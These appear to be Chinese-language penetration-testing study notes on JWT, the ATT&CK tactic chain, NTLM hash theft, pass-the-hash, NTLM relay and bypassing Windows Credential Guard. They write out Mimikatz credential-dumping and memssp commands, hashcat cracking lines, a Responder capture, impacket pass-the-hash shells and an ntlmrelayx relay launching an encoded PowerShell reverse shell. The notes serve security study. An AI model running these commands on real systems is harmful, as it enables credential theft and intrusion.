...
- Payload: 描述身份
  ...
  ```
- Signature: 目的是防偽，secret / private key 算出來

#### 正常登入流程

1. Login: `POST /login`
2. Server發JWT給User: `eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJST0xFX0FETUlOIn0.xxx`
3. User帶Token存取API: `Authorization: Bearer <JWT>`
4. Server 驗證 JWT
   1. Parse Header
   2. `alg`
   3. 用對應方式驗證 signature
...
3. 持續潛伏 Persistence 5. 註冊 scheduled task，定期執行惡意程式 6. 建立後門帳號
...
4. 權限提升 Privilege Escalation 7. 利用漏洞將使用者提權至 Administrator
5. 憑證存取 Credential Access 8. 從作業系統取得明文密碼、NTLM hash
6. 探索 Discovery 9. 掃描系統上的帳號，內網中的網路服務、芳鄰、其他機器
7. 橫向移動 Lateral Movement 10. 透過 RDP、WinRM ，利用已取得的 credential 或本身權限移動至其他機器
8. 蒐集 Collection 11. 蒐集文件、瀏覽器、Email、剪貼簿等資料
   - [Att&CK - T1115 (Clipboard Data)](https://attack.mitre.org/techniques/T1115/): 收集複製貼上的內容，如果剛好複製了帳號、密碼、信用卡號就

9. 指揮與控制 Command & Control (C2) 12. 與攻擊者的 C2 server 連線，取得後續指令
10. 滲出 Exfiltration 13. 將資料透過連線傳回攻擊者的 C2 server
...
Windows Vista 開始引入的安全機制。即使用管理員帳號登入，程式預設只以標準權限運行，需要管理員權限時會彈出確認視窗。

**UAC Remote Restrictions：** Vista 開始預設啟用，透過網路連線時即使提供管理員帳號的密碼或 hash，也會被降級為標準權限，無法執行管理操作（如 psexec）。

**例外：** 內建的 `Administrator` 帳號（RID 500）不受此限制，因此 PtH 和 Relay 攻擊通常需要使用此帳號。

#### NTLM Hash

- 存放位置：SAM 資料庫（`C:\Windows\system32\config\sam`），OS 運行時有檔案鎖
- 舊的 LM hash 很弱（不分大小寫、最長 14 字元、分成兩段），Vista 後預設停用
- NTLM hash 改善了 LM 的弱點，但**沒有加鹽（not salted）**，同一密碼永遠產生同一 hash
- 提取工具：Mimikatz（需 Administrator 權限 + SeDebugPrivilege）
  ```
  privilege::debug
  token::elevate
  lsadump::sam              # 從 SAM 提取
  sekurlsa::logonpasswords  # 從 LSASS 記憶體提取（含 domain 帳號）
  ```
- 破解：`hashcat -m 1000 hash.txt rockyou.txt -r best66.rule`

#### Net-NTLMv2 Hash

- 與 NTLM 的差異：NTLM 存在 SAM 中（靜態），Net-NTLMv2 是**網路認證過程中**產生的 challenge-response（動態）
- 適用場景：無法用 Mimikatz（非管理員權限）時，誘導目標對我們的 SMB server 進行認證
- 攻擊流程：
  1. Kali 啟動 Responder：`sudo responder -I tun0`
  2. 目標觸發 SMB 認證：`dir \\KALI_IP\test`（透過 bind shell、檔案上傳 UNC 路徑等）
  3. Responder 捕獲 Net-NTLMv2 hash
  4. 破解：`hashcat -m 5600 hash.txt rockyou.txt`

#### Pass-the-Hash（PtH）

**原理：** NTLM 認證過程中從不傳輸明文密碼，只使用 hash：

```
1. 客戶端：我要登入，我是 Administrator
2. 伺服器：這是一個隨機 challenge
3. 客戶端：用 NTLM hash 加密 challenge → 產生 response
4. 伺服器：用自己存的相同 hash 加密相同 challenge → 比對結果
5. 一致 → 認證成功
```

攻擊者直接從「hash → 加密 challenge」開始，跳過密碼轉換步驟，伺服器無法區分兩種情況。

**成功的三個根本原因：**

1. NTLM hash 沒有加鹽 → 同一密碼永遠相同 hash
2. Hash 是靜態的 → 不因 session/時間/機器改變
3. 跨機器通用 → 兩台機器相同帳密 = 相同 hash

**條件：**

- 目標帳號需有管理員權限
- 非內建 Administrator 帳號需 UAC remote restrictions 關閉

**工具：**

| 用途         | 工具             | 指令                                                         |
| ------------ | ---------------- | ------------------------------------------------------------ |
| SMB 存取     | smbclient        | `smbclient \\\\IP\\share -U Administrator --pw-nt-hash HASH` |
| SYSTEM shell | impacket-psexec  | `impacket-psexec -hashes 00..00:HASH Administrator@IP`       |
| 使用者 shell | impacket-wmiexec | `impacket-wmiexec -hashes 00..00:HASH Administrator@IP`      |

#### Relay Net-NTLMv2

當 Net-NTLMv2 hash 無法破解時，可將認證中繼到另一台機器：

```bash
# 啟動 relay（指向目標，附帶 reverse shell 指令）
impacket-ntlmrelayx --no-http-server -smb2support -t TARGET_IP -c "powershell -enc BASE64..."

# 在來源機器觸發 SMB 認證到 Kali
dir \\KALI_IP\test
```

條件同 PtH：非內建 Administrator 需目標關閉 UAC remote restrictions。

#### Windows Credential Guard

- 利用硬體虛擬化（Hyper-V）建立隔離記憶體區域（VBS/VSM）
- VTL0 = 正常 Windows 環境，VTL1 = 安全隔離環境
- LSAISO.exe 在 VTL1 運行，加密所有快取的 hash → Mimikatz `sekurlsa::logonpasswords` 無法取得明文 hash
- **本地帳號**的 NTLM hash 仍可提取（Credential Guard 只保護 domain 帳號）
- 繞過方式 — 注入惡意 SSP：
  ```
  mimikatz # misc::memssp
  ```
  注入後任何使用者登入的**明文密碼**記錄於 `C:\Windows\System32\mimilsa.log`
- Windows 10/Server 2016 開始支援，現代全新安裝預設啟用，系統更新保留原本啟停狀態
- 檢查：`Get-ComputerInfo` → `DeviceGuardSecurityServicesRunning`
